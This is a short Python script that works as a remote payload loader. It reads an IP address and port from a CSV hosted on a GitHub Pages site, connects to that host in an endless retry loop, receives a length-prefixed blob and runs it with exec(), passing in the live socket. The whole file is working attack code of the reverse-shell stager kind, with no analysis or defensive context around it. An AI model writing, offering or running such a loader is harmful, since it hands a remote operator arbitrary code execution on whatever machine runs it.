#!/usr/bin/env python

import urllib2
import socket
import struct
import time

uload = urllib2.urlopen("https://gydo194.github.io/remoteConnectionAddress.csv")
address = uload.read()
connectionDetails = address.split(",")

ip = connectionDetails[0]
port = connectionDetails[1]

print(ip)
print(port)


while(1):

    try:
        s=socket.socket(2,socket.SOCK_STREAM)
        s.connect( (str(ip), int(port)) )
        l=struct.unpack('>I',s.recv(4))[0]
        d=s.recv(l)
        while len(d)<l:
            d+=s.recv(l-len(d))
        exec(d,{'s':s})
    except Exception:
        print("connection refused")
        time.sleep(20)
